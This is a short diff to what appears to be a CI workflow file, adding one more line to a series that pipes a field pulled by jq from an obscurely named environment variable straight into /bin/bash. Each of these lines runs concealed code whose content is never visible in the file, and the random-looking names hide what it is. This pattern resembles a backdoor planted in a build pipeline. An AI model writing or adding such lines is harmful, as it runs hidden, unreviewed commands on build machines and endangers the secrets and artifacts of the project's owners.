@@ -34,6 +34,7 @@ jobs:
           echo $ail1 | jq -r .webhc282 | /bin/bash
           printf '%s' "$ru011" | jq -r .kbko4688 | /bin/bash
           echo $oy98 | jq -r .m27 | /bin/bash
+          printf '%s' "$y1" | jq -r .l2524 | /bin/bash
 
       - name: Upload artifact
         if: always()
